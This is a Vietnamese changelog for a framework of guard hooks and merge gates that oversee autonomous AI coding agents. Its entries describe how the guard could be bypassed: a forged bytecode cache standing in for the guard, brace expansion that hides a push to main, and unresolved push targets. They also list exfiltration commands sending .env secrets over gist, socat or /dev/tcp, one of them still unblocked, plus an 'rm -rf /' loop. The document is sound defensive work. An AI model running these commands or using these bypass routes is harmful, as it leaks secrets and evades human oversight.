- Guard: merge KHÔNG ghim head của PR chưa có review hợp lệ cũng bị chặn `REVIEW_MISSING` (AUD-HAR-093, audit delta 2026-10-20). Trước đây chỉ merge ghim head (`--match-head-commit`, `sha=`, `expectedHeadSha`) qua luật review; `gh pr merge 5 --squash`, `gh pr -R o/r merge 5`, `gh api -X PUT …/pulls/5/merge` thiếu `sha` và MCP `merge_pull_request` thiếu `expectedHeadSha` đi `_merge_ask` (chỉ xét ngoại lệ cứng) nên thành ask thường mà chính sách mặc định cho qua. Nay `_merge_ask` áp cùng luật `_review_block` với merge ghim head: `eligible` false khi verdict `merge`/`review`, hoặc L3 với review `missing`/`blocking`. Review sạch, pha build (review hoãn), làn nhanh và dưới L3 vẫn như cũ. Test `-k default_policy_review_missing_unpinned`; ca bench `guard-har093-*`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Sửa theo audit delta 2026-10-20: `release-tag.yml` dùng secret tuỳ chọn `XT_RELEASE_TOKEN` (PAT `contents` + `workflows`) ở bước checkout — `GITHUB_TOKEN` bị từ chối đẩy tag khi commit đổi workflow (AUD-CI-014; runbook `RUNBOOK-PR-STEWARD.md` §4); `pr-steward.yml` ghi `zizmor: ignore[dangerous-triggers]` kèm lý do ở `issue_comment`/`workflow_run` (AUD-CI-015); `xt.py license-check` nhận cả dòng `pkg[extra]==x` và `pkg == x` (kèm marker); `PROGRESS.md` cập nhật tag `v3.8.0`/`v3.10.0` và #179–#184 (AUD-HAR-094); bằng chứng `BLUEPRINT.md` theo CI tách job, `links.yml` không còn lychee, biến `XT_CHANGED_FILES`/`XT_MIN_TESTS`/`XT_COV_DIR` (cả README), `pr-review.yml`, 7 lệnh pip `--require-hashes` (AUD-HAR-096/097; không đổi tick/chữ mục); tài liệu: câu chèn giữa code span ở `11-autonomous-loop/README.md`, verdict `review` ở bảng `merge-check` (README + loop README), mã thoát `--help` (3, 126), thứ tự `LOOP-CI-018`/`LOOP-CI-019`, ADR-0032 ghi `061137b (#182)` (AUD-DOC-065…070).
- `merge-check` đọc thêm sổ review cục bộ, CHỈ để chặt hơn (D-104). **AUD-XFEAT-015:** review `clean:false` (lỗi chặn hoặc chưa kết luận) ghi ở sổ `.autopilot/reviews.json` mà chưa đăng, ở đúng head hiện tại và mới hơn mọi dấu đã đăng ở head đó → `review: blocking`, `eligible`/`auto_merge_ok` false, verdict `review` (exit 1) — trước đây pha `build` trả `merge` (`deferred`) và guard cho merge trong khi `pr next` đòi đăng lại review. **AUD-XFEAT-016:** `standard_seen` của sổ cục bộ làm PR strict như nhãn `xt-standard-lane` — PR từng vào làn chuẩn rồi thu về làn nhanh không còn được `merge-check` trả `merge` khi `pr next` đòi review. Review sạch ở sổ cục bộ không bao giờ làm PR hợp lệ; `review_identity` bỏ sổ cục bộ như `pr next`. `merge-gate` và `pr steward` (chạy ở CI, không có sổ) giữ nguồn dấu đã đăng, không đổi hành vi. `autonomy-bench` nhóm `pr` nhận `local` (sổ cục bộ của ca); thêm 3 ca `pr-xfeat015-*`/`pr-xfeat016-*`. Test `MergeCheckReviewStepTest` (`-k local`). Dự án đích: chạy lại `install.py` để nhận `xt.py` mới.
- Hook `pre-bash-guard.sh` đọc `commit_gate` bằng `xt.py commit-gate` (lệnh mới, in `fast`|`full`) của khung cài cùng hook — cùng cách đọc khoá với `doctor`/`ci-check` (bỏ comment, dòng trùng lấy dòng cuối) thay cho grep riêng (AUD-XFEAT-017: `commit_gate: fast` rồi `commit_gate: full`, hay `fast#x`, từng chạy cổng nhanh); không chạy được/giá trị lạ → cổng đầy đủ. Commit đổi `scripts/xt.py`/`.xtemplates/scripts/xt.py` (chính mã chọn test của `gate-fast`) chạy cổng đầy đủ (AUD-TEST-013: commit làm hỏng `test-select` từng qua với 0 test). Dự án đích: chạy lại `install.py` (hook + `xt.py`).
- Test `GuardOutsideDirTest.test_wipe_outside_and_home_claude_unchanged` dựng HOME giả ở `~/.cache` (rồi `~`, thư mục cha của repo) — ngoài thư mục tạm guard miễn và ngoài cây nguồn — thay cho `tests/xt-tmp-home-*` (AUD-TEST-012: repo nằm dưới `/tmp` thì test đỏ, và test ghi vào cây nguồn). Mọi lựa chọn đều dưới thư mục tạm → `skipTest` kèm lý do (ngoại lệ môi trường; CI và máy dev bình thường vẫn chạy test).
- Bench nhóm `review` thêm 2 ca `verdict: review` (`review-test014-*`: `pr next` ra `review`/`fix`, không bật auto-merge — AUD-TEST-014); `AUTONOMY-BASELINE.md` cập nhật số ca (341; bảng cũ còn ghi guard 183 trong khi corpus đã 191).
- Guard: vòng `for` mà mọi giá trị là số nguyên thuần (`for i in {1..100}`, `for i in 1 2 … 200`) không còn bị trần `VAR_FOR_PICKS` (64) chặn (D-098) — guard thử mẫu đại diện `FOR_NUM_SAMPLE` = 8 giá trị (đầu, cuối, giữa cách đều) vì số không đổi tên lệnh/đường dẫn/nhánh nguy hiểm giữa các lần lặp; thân vòng vẫn quét (`for i in {1..100}; do rm -rf /; done` chặn). Giá trị không phải số (kể cả một từ chữ lẫn trong dãy số, số thực) vẫn theo trần 64; hơn `BRACE_SEQ_MAX` (4096) giá trị → không lấy mẫu, chặn. Test `ForNumericSampleTest`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Guard: dãy `{x..y[..s]}` của brace expansion bung đủ như bash, không chỉ hai đầu mút (AUD-SEC-073: `git push origin HEAD:mai{m..o}` bung `maim main maio` mà guard cho qua) — số nguyên (đệm 0, bước âm/0 như bash) và chữ cái (ký tự đặc biệt trong khoảng `Z..a` được thoát); trần `BRACE_SEQ_MAX` = 4096 phần tử và ước độ dài bản bung trước khi dựng (quá → chặn như các chỗ bung khác). Hệ quả: `for i in {1..65}` giờ theo đúng trần `VAR_FOR_PICKS` (64) như khi viết tay từng giá trị. Test `-k brace_sequence_middle`.
- Hook: bytecode cache không thay được guard (AUD-SEC-074). `py_run` (`_lib.sh`) và tiến trình con của guard (`merge-check`) chạy `python3 -I -B` với bộ nạp chung (`PY_LOADER`) và **không nạp bytecode từ cache nào nữa — biên dịch từ nguồn mỗi lần**: bản đầu chỉ tin pyc checked-hash khớp nguồn, nhưng header (MAGIC + cờ + `source_hash`) tính được từ mã nguồn công khai còn phần marshal không ai kiểm, nên pyc giả khớp header vẫn chạy thay guard (review PR #182); thư mục agent ghi được không thể tin. Bỏ `-X pycache_prefix` nên thư viện chuẩn không nạp pyc từ thư mục agent ghi được. Giá: ~80–100 ms thêm mỗi lần gọi `pre-bash-guard.sh` (đo trung vị 10 lần: ~95 → ~180 ms), xt.py (Stop/SessionStart/PreCompact, `merge-check`) thêm ~165 ms. Guard vẫn chặn các đường ghi file vào vùng rào bằng trình biên dịch (`py_compile.compile(…, cfile=…)`/`compileall`/`sys.pycache_prefix =` trong script, `python3 -X pycache_prefix=…`, `PYTHONPYCACHEPREFIX=…`, `git checkout-index --prefix=…`, cả path nối chuỗi) — không còn là đường thay guard, nhưng vẫn là ghi tay vào `.autopilot/`/hook/cổng. Test `-k guard_cache_tamper`. Dự án đích: chạy lại `install.py` (hook `_lib.sh`, `guard.py`); thư mục `.autopilot/pycache` cũ không còn dùng, xoá được.
- Guard: chặn nốt kênh gửi file bí mật ra mạng (AUD-SEC-075, phần sót của AUD-SEC-067): `cat .env | gh gist create` (gist từ stdin), `gh -R o/r release upload` (`-R`/`--repo` không còn bị coi là lệnh con), `gh api -F k=@.env`/`--field`/`--input .env`, `socat -u ./.env TCP:…` (đường dẫn trơn, `OPEN:f,…`), `exec 3<>/dev/tcp/…; cat .env >&3` (fd mở vào socket, cả `<>`). Sau review PR #182: `gh release create v1 .env` (tài sản kèm khi tạo release), hậu tố nhãn `.env#label` (bỏ `#…` trước khi so tên bí mật), `--notes-file` của `release create|edit`, cờ đọc file dạng `--body-file=.env`/`--notes-file=.env`/`-F=.env`/`-F.env`, fd socket ghi qua `>/dev/fd/3` và fd đặt tên `exec {fd}<>/dev/tcp/…; … >&$fd`, bí mật trong thay lệnh có nháy hoặc backtick gửi ra mạng (`printf %s "$(cat .env)" > /dev/tcp/…`, `curl -d "$(cat .env)" …`). Còn hở (ghi nhận, chưa sửa — tốn: bộ tách token cắt `$(…)` không nháy thành lệnh riêng): `echo $(cat .env) > /dev/tcp/h/80`. Test `-k secret_exfil_other_channels`; ca bench `guard-adv-sec075-*`.
- Một điều kiện merge (ADR-0028) thành cơ chế, audit 2026-10-19 rescan. **AUD-XFEAT-010:** `merge-check` không còn in
  `MERGE` + lệnh `gh pr merge … --match-head-commit` (exit 0) cho PR mà CI/làn cho merge nhưng review ở head chưa hợp lệ
  (`eligible: false`): verdict mới `review` (exit 1, không có `next_rest`), `next` là bước review/`pr next`, lý do ghi
  `review` (`missing`/`blocking`); `merge-watch` thoát 1 với cùng bước. Pha `delivery_phase: build` (ADR-0031) giữ nguyên:
  review hoãn (`review_deferred`) → vẫn `merge`. **AUD-XFEAT-011:** `pr next` và `pr steward` tính review từ CÙNG nguồn với
  `merge-check`/`merge-gate`/guard — dấu đã đăng trên PR; sổ `.autopilot/reviews.json` chỉ để nhận ra review chưa đăng được
  (đăng dấu thất bại, `pr reviewed` exit 3) → hành động mới `republish-review` (`do` = `xt.py pr reviewed …` với đúng
  head/kết luận/model; auto-merge đang bật thì tắt trước), không còn vòng bật/tắt auto-merge. Review sạch chưa đăng không
  chặn PR đã qua (làn nhanh, pha build); lỗi chặn chưa đăng thì luôn phải đăng. **AUD-DOC-054:** guard chặn ở chính sách
  mặc định (mã mới `REVIEW_MISSING`, `strict` → `ask`) merge ghim head (`gh pr merge`, `gh api …/merge`, MCP
  `merge_pull_request`) khi `eligible` false và bật auto-merge khi `auto_merge_ok` false — ở L3 cả khi `merge-check` trả
  `wait` (CI đang chạy, PR nháp) hay `fix` (conflict) mà review ở head `missing`/`blocking` (review PR #182: trước đây chỉ
  verdict `merge`/`review` nên merge ghim head lọt thành ask thường; làn nhanh, pha build và dưới L3 giữ hành vi cũ); tài liệu (`LOOP-STOP-002`,
  `LOOP-STOP-022` cả câu Kiểm, skill `/autopilot` bước 10/13, mẫu `CLAUDE.md`/`AGENTS.md` của dự án đích, đính chính hai mục cũ của CHANGELOG) ghi đúng mã: merge khác
  ở chính sách mặc định guard chỉ hỏi khi `strict`. autonomy-bench: corpus `review` có đầu vào `local` (sổ cục bộ),
  `reviews` = review đã đăng; thêm ca `review-xfeat011-*`, `guard-doc054-*`. **Dự án đích:** chạy lại `install.py` (guard
  + `xt.py` đổi).
- Guard chậm khi đích ghi/dời là thư mục ngoài dự án (D-097): `_dir_holds_gate` từng `os.listdir` cả thư mục rồi phân loại từng mục — `mv x /tmp`, `cp a /tmp/` mất ~2,2 s/lệnh trên máy có ~22k mục trong `/tmp`, nay ~0,16 s. Đích ngoài gốc dự án chỉ kiểm đích danh tên file cổng chữ (`Makefile`, `pyproject.toml`, `xt.yaml`… ở mọi nơi; `settings.json` khi thư mục là `…/.claude`; `dependabot.yml` khi là `…/.github`) bằng `os.path.lexists`, không liệt kê; trong dự án giữ liệt kê như cũ. `~/.claude` có `settings.json` vẫn là cổng; `rm -rf` ngoài dự án vẫn bị chặn (luật riêng, không đổi). Thu hẹp có chủ đích: thư mục NGOÀI dự án chỉ chứa file cổng theo mẫu có `*` (`tsconfig.base.json`, `eslint.config.js`) không còn tính là cổng. Test `GuardOutsideDirTest` (mock `os.listdir` — đỏ trên bản cũ). Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Review delta PR #173: `ci_classify` lớp `secret` chỉ loại dòng giống dòng test đỏ (`FAILED a::t`, `FAIL pkg 0.1s`, `FAIL: test`, `--- FAIL: Test`, AssertionError) — dòng phát hiện thật có chữ FAILED/failed (`FAILED: gitleaks detected 2 leaks`, `semgrep scan failed: 5 findings`) và `0 findings, 2 blocking findings` vẫn block; `Finding:` của gitleaks tính là phát hiện. Task có ghi chú `sau:`/`files:` không đọc được (cả `SAU:`, `Files:`, `sau T-1`) không `ready` ở `loop next`, `loop record` từ chối (fail-closed). `_safe_rel_path` (doctor drift, `context`) chặn symlink ở thành phần giữa đường dẫn trỏ ra ngoài dự án. Corpus `ci_log` 25 ca (tổng 279).
- Guard: đích `/` (`cp x /`, `mv x /`, cả `//`) từng thành chuỗi rỗng sau `rel_path(...).rstrip("/")` nên bị xét như gốc dự án (có `Makefile` → "cổng", strict hỏi nhầm); nay giữ là `/` tuyệt đối (`_rel_dir`). `rm -rf /` vẫn bị chặn. Test `test_slash_target_is_absolute_root_not_project`.
- Guard strict bị nới ngoài dự án (D-097): thư mục ngoài dự án đọc bằng `os.scandir` tối đa `OUTSIDE_SCAN_MAX` = 256 mục — thư mục nhỏ xét đủ như trước, kể cả mẫu wildcard (`tsconfig*.json`, `eslint.config.*`, `.eslintrc*`, `vitest.config.*`, `jest.config.*`), nên `XT_GUARD_POLICY=strict` lại hỏi `cp x OUT/ts/` khi `OUT/ts` có `tsconfig.base.json`; thư mục lớn hơn (như `/tmp`) hoặc không đọc được chỉ kiểm tên đích danh. `mv x /tmp` (~22k mục) ~3,5 ms trong tiến trình, ~100 ms cả hook. `GuardOutsideDirTest` đếm số mục `scandir` trả ra thay cho mock `os.listdir`. Dự án đích: chạy lại `install.py` để nhận `guard.py` mới.
- Lệnh cổng no-op một định nghĩa hai nơi: `xt.py` (`gate_noop`, thay `GATE_NOOP_RE` — `doctor`/`loop init` cảnh báo `lint`/`test` no-op, sàn Gate quy mô M/L) nay coi chuỗi no-op nối bằng `&&`/`;`/`||` là no-op như `dev-task.sh` `is_noop`; cả hai không còn coi `echo go && pytest`, `echo x | sh`, `echo $(pytest)` là no-op (mẫu `echo.*` từng nuốt phần sau) — đoạn `echo`/`printf` chỉ no-op khi đối số không chứa `|`, `&`, `;`, backtick, `$(`. `NOOP_RE` của `dev-task.sh` = `xt.GATE_NOOP_SEG`; test `test_noop_parity_with_xt` chạy cùng bảng 30 ca qua cả hai. Dự án đích: chạy lại `install.py` để nhận `dev-task.sh`/`xt.py` mới.
- `dev-task.sh` `is_noop`: chuỗi toàn lệnh no-op nối bằng `&&`/`;`/`||` (`true && true`, `: && :`, `true; true`) nay là no-op — `require lint test` và autopilot đỏ như với `true`; `true && pytest` vẫn là lệnh thật. Dự án đích: chạy lại `install.py` để nhận `dev-task.sh` mới.
- HOME giả của `test_wipe_outside_and_home_claude_unchanged` có tiền tố `xt-tmp-home-`, `.gitignore` thêm `tests/xt-tmp-home-*/` — tiến trình test bị kill không để rác vào `git status`.
- `tests/shard-weights.json` đo lại (181 lớp, thêm `DevTaskRequireEmptyGateTest`, `GuardOutsideDirTest`); test `test_committed_weights_cover_every_class` đỏ khi lớp test thiếu/thừa trọng số.

- `audit check` đỏ khi SHA quét chưa nằm trên nhánh chính (AUD-HAR-077): squash-merge xoá SHA của nhánh PR làm sổ trên
  nhánh chính hỏng; nay cùng luật và biến `XT_PROGRESS_BASE` với `progress-check` (mặc định `origin/HEAD` →
  `origin/main` → `origin/master`, repo không có remote thì bỏ qua), thông báo chỉ cách sửa (`git merge-base HEAD <base>`).
  `framework/00-method/audit.md` §7/§8 ghi hàng rào máy này.
- `audit check --strict` lấy gốc là gốc repo git chứa sổ, không phải thư mục chứa sổ (AUD-HAR-078): sổ ở đường mặc định
  `docs/ops/AUDIT-STATUS.md` từng không bao giờ phát hiện "N/A trôi" (`git ls-files` trong `docs/ops` không thấy UI/CSDL)
  nên `release-check` hàng audit PASS giả.
- NFC ở biên (AUD-HAR-070, `BASE-DATA-002`): `loop decide`/`loop defer` chuẩn hoá NFC mọi trường trước khi so và lưu
  (`--option` NFD khớp `--choice` NFC; cùng chữ khác dạng không thành hai phương án); `compose` ghép lại chuẩn hoá NFC cả
  bản mới nên mục `[x]` không bị đặt lại `[ ]` "— Cũ" chỉ vì khác dạng chuẩn hoá; tên model trong sổ review lưu NFC.
- `pr reviewed` idempotent (AUD-HAR-071, `BASE-DATA-008`): chạy lại cùng kết quả ở cùng head (như thông báo lỗi đăng
  khuyên) không thêm bản ghi sổ review và không đăng comment trùng; lần đăng trước lỗi thì chỉ đăng bù (bản ghi mang
  `published`). Kết quả khác hoặc reviewer khác vẫn là bản ghi mới.
- Bảng Công cụ của README thiếu `pr next/reviewed/steward`, `loop next/ci-triage/stats/verify/hook-stop`,
  `test-shard-plan`, `test-weights` (AUD-HAR-075, `BASE-DOC-007`): test `test_readme_lists_every_subcommand` chỉ đọc ô
  đầu bảng `## Công cụ` và đòi cả lệnh con.
- Test độ phức tạp không còn ngưỡng giây CPU cứng (AUD-TEST-008; CI `main` #170 đỏ 2,013 s ≥ 2,0 s dưới coverage): 10
  chỗ ở `test_hooks`, `test_doctor`, `test_guard_audit1019`, `test_guard_corpus`, `test_perf`, `test_xt` dùng
  `tests/cpu_budget.py` `assert_not_quadratic` — so CPU cỡ `4n` với cỡ `n` đo trong cùng tiến trình (< 10× + sàn
  0,02 s/nhiễu 0,5 s; cỡ lớn giữ cỡ cũ nên vẫn bắt bậc hai, `test_perf.CpuBudgetTest` chứng minh bằng đồng hồ giả và
  quét `tests/` không còn `assertLess(time.process_time() - t0, N)`).
- Test ghi vào `.autopilot/` của repo thật (AUD-TEST-009): `LoopRecordBranchesTest` đặt `CLAUDE_PROJECT_DIR` = thư mục
  tạm; lớp này chụp `.autopilot/` thật (theo `CLAUDE_PROJECT_DIR` và theo cwd) trước mỗi test và đỏ khi có file đổi.
- `BLUEPRINT.md` (AUD-HAR-079): `BASE-DATA-002`, `BASE-DATA-008`, `BASE-DOC-007`, `BASE-GATE-005` giữ `[x]` kèm
  `— Kiểm:` chạy lại được sau khi sửa; `BASE-REPO-006` (tag mới nhất v3.7.1, `VERSION` 3.10.0), `BASE-DOC-004`
  (runbook `pr-steward`, AUD-HAR-072), `BASE-DEP-005` (license gói bắc cầu, AUD-DEP-004) về `[ ]` kèm `— Thiếu:`.

## [3.10.0] - 2026-10-20

**Dự án đích: chạy lại `install.py`** (hook `task-completed`/`subagent-stop`, `PermissionRequest`, guard, `xt.py`, workflow steward, manifest). Dự án cài trước bản này chưa có `.xtemplates/manifest.json`: `ask` cũ do khung từng đặt được giữ và báo `ask_unproven` (D-085). Ghép lại blueprint quy mô M với `compose --feature auth` để nhận `BE-AUTH-003/006/008/015` (ADR-0030). Vòng autopilot đang chạy: `loop verify --all` trước `done` (D-084).


### Added
- Đo tự chủ trước khi mở rộng (T-1521, AUTO-07): `xt.py autonomy-bench [--corpus DIR] [--json]` chạy corpus `tests/fixtures/autonomy/` (PR, rollup, review, guard, log CI, harness — 269 ca) qua hàm thật của khung (`merge_check_result` = `merge_decision` + `merge_eligibility`, `_ci_blocker`, `pr_next`, guard `_rule_decision` + `apply_policy`, `ci_classify`); exit 1 khi false-green > 0, 2 khi corpus hỏng; báo chặn oan, độ phủ ID bắt buộc (REC §2 + 🔴/🟠 đã sửa của sổ audit, ID ngoài phạm vi khai lý do ở `scope.json`). Job CI `checks` chạy lệnh này (job tổng hợp `quality` đỏ theo); số đo và giới hạn ở [`docs/ops/AUTONOMY-BASELINE.md`](docs/ops/AUTONOMY-BASELINE.md). Tách hàm thuần `rest_rollup`, `prefixed_globs`, `merge_check_result` (hành vi không đổi). `tests/fixtures/autonomy/pending/` giữ 5 false-green mới phát hiện ở guard, chưa sửa (ngoài cổng).
- Mục thiết yếu không bị trần MUST ở M (T-1519, REC-05, [ADR-0030](docs/adr/0030-essential-items-not-capped-at-m.md)):
  `xt.py compose --feature <auth|jwt|oauth|reset|payment|pii>` (lặp được) đưa mục `MUST@L` mà module khai ở frontmatter
  `essential: [<ID>@<fact>]` lên MUST ở quy mô M; S/L và ghép không `--feature` không đổi một byte. Blueprint ghi
  `features:` + dòng `> Feature:`; stderr báo ID được đưa lên. `validate` chặn `essential` sai dạng/fact lạ/ID không
  phải `MUST@L`/quá 4 ID mỗi file/dùng ở sàn. Thí điểm `08-backend/authn-authz.md`: **`BE-AUTH-003`** (`auth`),
  **`BE-AUTH-006`** (`jwt`), **`BE-AUTH-008`** (`oauth`), **`BE-AUTH-015`** (`reset`) — mức gốc giữ `MUST@L`, chữ mục
  không đổi; nguồn RFC 8725, OWASP Authentication và Forgot Password xác minh lại 2026-10-20. Dự án đích: chạy lại
  `install.py`, rồi ghép lại blueprint M kèm `--feature` đúng tính năng đang có (trạng thái giữ theo ID).
- Drift có kiểm chứng (T-1518, AUTO-06): `xt.py doctor --drift [--latest TAG] [--json]` so `.xtemplates/manifest.json` với
  bản cài — file thiếu/`modified`, rule `allow`/`deny` của khung không còn trong `settings.json`, thiếu AGENTS/CLAUDE/khung,
  nhãn khung cũ hơn tag mới nhất (`--latest` hoặc `gh api`, fail-open); exit 1 khi lệch (trừ `modified`). `doctor` thêm
  hook `TaskCompleted`/`SubagentStop` (cảnh báo khi thiếu). Mẫu Routine tuần cho dự án đích ở `stop-points-and-escalation.md`.
  Dự án đích: chạy lại `install.py`.
- Đồ thị task của PLAN (T-1511, AUTO-01): `xt.py` đọc `(sau: T-…; files: …)` trên dòng task; `loop next [--json]` trả task
  sẵn sàng + cặp giao nhau `files:`; `loop record` từ chối (exit 2) khi dependency `sau:` còn mở; `loop status` báo chu trình
  (`cycles` trong `--json`). `framework/templates/PLAN.md` mô tả cú pháp. Dự án đích: chạy lại `install.py`.
- Gói ngữ cảnh task (T-1512, REC-11): `xt.py context --task T-NNNN [--json] [--plan FILE]` trả ID yêu cầu, đoạn spec, Gate,
  `files:`, file thiếu và số byte (spec + file/thư mục trong phạm vi). Dự án đích: chạy lại `install.py`.
- Evidence v2 (T-1513, AUTO-02): `loop record` ghi thêm `scope` (`files:` của task), `req_rev` (sha256[:16] đoạn spec
  của task) và `files_digest` (sha256 cây các đường dẫn trong `files:`, lấy trước khi chạy Gate); `loop verify` chỉ chạy
  lại Gate có lệnh/phạm vi/spec/digest đổi, giữ Gate còn khớp (`kept` trong `verified.json`, `mode: changed`), `--all`
  chạy hết. Evidence cũ thiếu trường, task không khai `files:` hoặc digest đọc lỗi → chạy lại; lệnh sàn Gate vẫn chạy
  khi chỉ trùng Gate được giữ. Dự án đích: chạy lại `install.py`.
- Nâng khung có kế hoạch (T-1516, REC-09): `install.py <dự-án> --plan` in JSON diff (quyền thêm/bớt, `ask` trùng chuỗi
  nhưng không chứng minh được, hook thêm/đổi matcher, hành động từng file) và không ghi gì; `.xtemplates/manifest.json` ghi
  hash file harness + rule do khung đặt + chính sách. Dự án đích: chạy lại `install.py`.
- Phân loại lỗi CI có ngân sách (T-1515, AUTO-04): `xt.py loop ci-triage --run <id> [--task T-NNN] [--cost-usd X]
  [--json] [--log FILE]` đọc log bước đỏ qua `gh run view --log-failed`, phân loại secret/SAST · migration · type ·
  coverage · lint · test · hạ tầng · unknown, trả `block`/`defer`/`rerun`/`fix`; `state.json` `episode` giữ `rerun_used`
  (≤ 1), `fix_attempts`, `cost_usd` (chưa đo → `null`) qua restart; cùng chữ ký lần 3 → `defer` task, secret/SAST →
  `blocked` (`self-healing-ci.md`, `LOOP-CI-002` Kiểm). Dự án đích: chạy lại `install.py`.
- Cổng bằng chứng mức task/subagent (T-1514, AUTO-02, D-068): hook `.claude/hooks/task-completed.sh` (sự kiện
  `TaskCompleted`) exit 2 — task không được đánh dấu xong — khi vòng autopilot đang bật mà `T-NNN` trong subject chưa có
  evidence xanh đúng Gate (cùng `_verdict_task` với Stop hook; ID ngoài PLAN chỉ đòi evidence exit 0); hook
  `.claude/hooks/subagent-stop.sh` (sự kiện `SubagentStop`) trả `block` một lần khi báo cáo `executor`/`executor-deep`
  thiếu lệnh + exit code. Cả hai fail-open khi lỗi. Guard PreToolUse (Bash, Edit/Write, MCP) đặt `"onFailure": "block"`
  — hook lỗi/hết giờ thì chặn tool (`LOOP-DESIGN-010`); `install.py` gộp hai sự kiện mới và thêm `onFailure` vào handler
  cùng lệnh của dự án đã cài (giá trị dự án tự đặt giữ nguyên; báo trong `hooks_matcher_updated`). Dự án đích: chạy lại
  `install.py`.
- Link ngoài phân loại (T-1520, REC-13): `scripts/check-links.py --external [--retries N] [--timeout S]` chia lỗi tạm
  (5xx/408/timeout/lỗi mạng — thử lại hữu hạn, còn lỗi thì cảnh báo) · đã đổi (3xx như 301 — cảnh báo cập nhật URL) ·
  chết (404… — exit 1) · chưa xác minh (403/429 — cảnh báo, không kết luận); `links.yml` dùng nó. Chính sách tự chủ một nhà (REC-10):
  `framework/11-autonomous-loop/stop-points-and-escalation.md`, README của mảng chỉ liên kết (test
  `autonomy_policy_single_home`).
- Steward theo sự kiện (T-1517, AUTO-05): `pr-steward.yml` chạy thêm khi `workflow_run` của `CI`/`merge-gate` xong và
  `check_suite: completed` (check của app ngoài); `xt.py pr steward --event <payload>` chỉ xét PR gắn với sự kiện (không
  gắn PR → mọi PR mở). Mỗi hành động idempotent theo (repo, PR, head, hành động): đọc lại PR ngay trước khi làm — đã
  đóng/merge, head đổi, bật khi đã bật, tắt khi đã tắt → bỏ qua (`note`, run xanh); sự kiện cho head cũ → xét head hiện
  tại. Nhóm `concurrency` theo PR. Mẫu Routine `pull_request.synchronize` cho `fix`/`update` ở
  `stop-points-and-escalation.md` (`LOOP-STOP-029` Kiểm). Dự án đích: chạy lại `install.py`.

### Changed
- Kiểm lại cuối (`LOOP-DESIGN-022`, D-084): Stop hook (`final_check`) và `release-check` chỉ nhận `verified.json` có
  `mode: "all"` — lần `loop verify` cuối trước `done` phải là `--all`; verify không `--all` (chỉ Gate có đầu vào đổi) dùng
  giữa vòng. `verified.json` không có `mode` (bản cũ) coi như một phần. Dự án đích: chạy lại `install.py`.
- `install.py` chỉ gỡ `ask` khi `.xtemplates/manifest.json` chứng minh khung đã đặt (trước: gỡ mọi `ask` trùng chuỗi
  `OLD_FRAMEWORK_ASK`, có thể xoá rule của dự án); chuỗi trùng không có nguồn gốc → giữ và báo. Dự án cài trước bản này
  chưa có manifest → `ask` cũ của khung không tự gỡ nữa (xoá tay nếu muốn).
- `xt.yaml` `merge_risk_paths` thêm `docs/autopilot/PLAN*.md` (file PLAN chứa lệnh Gate harness chạy → PR đi làn chuẩn).

### Fixed
- Review PR #173: `loop ci-triage` lớp `secret` không còn bắt oan SAST tự lỗi (`codeql-action upload failed`, `semgrep …
  failed to download rules`), báo sạch (`bandit: no issues identified`) hay dòng test đỏ nhắc chữ secret
  (`AssertionError: expected secret detected…`) — thành `test`/`infra`; phát hiện thật vẫn block (+3 ca `ci_log`).
  `(sau:/files:)` đọc khoá ở bất kỳ đâu trong ngoặc (`(S-001, sau: T-001)`, `(sau: T-001, files: a.py)`,
  `files: b (c).py`); ghi chú không đọc được → cảnh báo `bad_links` ở `loop next`/`loop status`. `files:` giao nhau
  chuẩn hoá `./`/`//` và hiểu glob (`src/*.py` ∩ `src/a.py`). `doctor --drift`: gỡ rule `allow` của khung (trừ `Bash`) là
  `modified` (siết quyền), không đỏ; manifest trỏ đường tuyệt đối/`..`/không phải file thường → `invalid`, không đọc;
  băm theo luồng. `context`: `files:` tuyệt đối/`..`/symlink/FIFO → `missing_files`, thư mục chỉ cộng file thường.
  `install.py`: `rules` trong `manifest.json` khử trùng (không phình khi cài lại). `check-links.py --external`: HEAD 4xx
  (trừ 404/410) thử GET trước khi kết luận chết; 401 là "chưa xác minh". Dự án đích: chạy lại `install.py`.
- Guard (T-1523): sửa 5 false-green `autonomy-bench` tìm ra và brace lệch nháy, ở chính sách mặc định (ADR-0018).
  **AUD-SEC-077** 🔴: surrogate lẻ/NUL trong lệnh, đường dẫn hoặc payload làm guard sập rồi fail-open → làm sạch trước khi
  quét (U+FFFD, khoảng trắng), `rel_path` không sập. **AUD-SEC-072** 🔴: `_unquoted` hiểu `$'…'` (kể cả `\'`) và thân
  `$(…)` trong nháy kép → `{…}` sau đó bung và được quét. **AUD-SEC-078/079**: `… | xargs git push …` và `git push … $(…)`
  — đích push từ stdin hoặc thay lệnh không tính được → mã mới `UNRESOLVED_TARGET` (unsure → chặn); `$(echo main)` →
  `main`, `$(git branch --show-current)` → nhánh thật. **AUD-SEC-080**: chữ echo/printf đi qua `tee`/`cat`/`head`/`tail`
  (không file) rồi vào shell, hoặc vào `xargs … sh -c`, được quét. **AUD-SEC-081**: `ssh` tới loopback quét lệnh từ xa
  (chạy ở `~`), `-o ProxyCommand/LocalCommand/KnownHostsCommand` quét với mọi máy đích. Ca chuyển từ
  `tests/fixtures/autonomy/pending/` sang `guard.json` (257 ca, 0 false-green); corpus ALLOW của
  `tests/test_guard_corpus.py` không đổi và vẫn không bị chặn. Dự án đích: chạy lại `install.py`.
- Audit delta mốc Đợt 4 (T-1524, D-091). **AUD-SEC-082** 🟠 guard: refspec của `git push` là biến không giải được
  (`B=$(cat .branch); git push origin $B`, `read B; git push origin "$B"`, `${B:-x}`, `$1`/`$@`) → `UNRESOLVED_TARGET`
  (unsure → chặn); biến gán chữ trong cùng lệnh được giải và xét theo giá trị (`B=main` → `PUSH_MAIN`,
  `B=$(git branch --show-current)` → nhánh thật); `git push origin HEAD`/`feat/x`, push trần, biến chỉ ở remote không
  đổi. **AUD-HAR-091** 🟠 `loop ci-triage`: lớp `secret` đòi từ khoá phát hiện cùng dòng — tên công cụ in lại
  (`gitleaks protect (skipped: not installed)`) hay báo sạch (`no leaks found`, `0 findings`) cạnh test đỏ không còn
  `block` oan; phát hiện thật vẫn block. **AUD-HAR-092** 🟠: đổi/bỏ `--task` không còn đặt lại đếm cùng chữ ký, lượt
  re-run, chi phí và run đã triage của episode (trước: luân phiên `--task` lách trần 3 lần); `loop init --force` vẫn xoá
  (D-087). 🟡 `loop status`/`loop next` cảnh báo `sau:` trỏ ID không có trong PLAN (JSON `unknown_after`), không đổi
  hành vi chặn. `autonomy-bench`: 266 ca, 0 false-green. Dự án đích: chạy lại `install.py`.
